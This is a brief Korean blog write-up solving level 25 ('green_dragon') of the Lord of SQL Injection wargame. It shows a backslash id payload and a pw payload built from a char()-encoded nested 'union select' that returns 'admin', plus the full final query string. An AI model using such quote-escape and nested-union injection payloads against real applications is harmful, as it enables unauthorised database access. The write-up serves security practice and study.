---
title: LOS - 25번 green_dragon
category: Lord of SQL Injection
---

# [25] green_dragon

## 문제

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fcvzy13%2FbtrocSsciXb%2FA4XrMQJ1aQFkquIV3RGSK1%2Fimg.png">

## 풀이

[1] id 페이로드

```
\
```


[2] pw 페이로드

```
union select char(92), char(117,110,105,111,110,32,115,101,108,101,99,116,32,99,104,97,114,40,57,55,44,49,48,48,44,49,48,57,44,49,48,53,44,49,49,48,41,32,35) %23
```

<br>

따라서, 최종 페이로드는 다음과 같다.

```
?id=\&pw=union select char(92), char(117,110,105,111,110,32,115,101,108,101,99,116,32,99,104,97,114,40,57,55,44,49,48,48,44,49,48,57,44,49,48,53,44,49,49,48,41,32,35) %23
```

## 결과

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbZVUrx%2FbtrocqCH4Rh%2FBlqAkOMkvzBAm7s9AwJQUk%2Fimg.png">